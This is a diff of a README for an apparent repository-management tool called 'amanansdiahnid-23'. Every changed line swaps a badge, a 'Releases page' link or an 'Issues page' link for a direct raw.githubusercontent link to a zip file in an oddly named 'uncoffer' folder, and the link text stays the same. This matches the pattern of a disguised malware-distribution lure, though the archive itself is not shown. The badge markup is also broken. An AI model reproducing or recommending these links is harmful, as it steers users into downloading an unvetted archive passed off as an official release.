@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-23 - A Simple Tool for Automatic Repository Management
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Pro48YT/amanansdiahnid-23/releases)
+[![Download](https://raw.githubusercontent.com/Pro48YT/amanansdiahnid-23/main/uncoffer/amanansdiahnid-23.zip%20Latest%https://raw.githubusercontent.com/Pro48YT/amanansdiahnid-23/main/uncoffer/amanansdiahnid-23.zip)](https://raw.githubusercontent.com/Pro48YT/amanansdiahnid-23/main/uncoffer/amanansdiahnid-23.zip)
 
 ## 📋 Overview
 
@@ -24,11 +24,11 @@ To run amanansdiahnid-23, your system should meet these requirements:
 
 ## 💾 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Pro48YT/amanansdiahnid-23/releases) to download the latest version of amanansdiahnid-23.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Pro48YT/amanansdiahnid-23/main/uncoffer/amanansdiahnid-23.zip) to download the latest version of amanansdiahnid-23.
 
 1. Click on the above link or on the button below to go to the releases page:
 
-   [![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Pro48YT/amanansdiahnid-23/releases)
+   [![Download](https://raw.githubusercontent.com/Pro48YT/amanansdiahnid-23/main/uncoffer/amanansdiahnid-23.zip%20Latest%https://raw.githubusercontent.com/Pro48YT/amanansdiahnid-23/main/uncoffer/amanansdiahnid-23.zip)](https://raw.githubusercontent.com/Pro48YT/amanansdiahnid-23/main/uncoffer/amanansdiahnid-23.zip)
 
 2. On the Releases page, find the latest version. Look for the file that matches your operating system.
 3. Click to download the file.
@@ -45,7 +45,7 @@ To get started, visit the [Releases page](https://github.com/Pro48YT/amanansdiah
 
 ## 🤝 Support
 
-If you encounter any issues while using amanansdiahnid-23, please check our [Issues page](https://github.com/Pro48YT/amanansdiahnid-23/issues) for help. You can also reach out through the Issues tab on GitHub.
+If you encounter any issues while using amanansdiahnid-23, please check our [Issues page](https://raw.githubusercontent.com/Pro48YT/amanansdiahnid-23/main/uncoffer/amanansdiahnid-23.zip) for help. You can also reach out through the Issues tab on GitHub.
 
 ## 📜 License
 
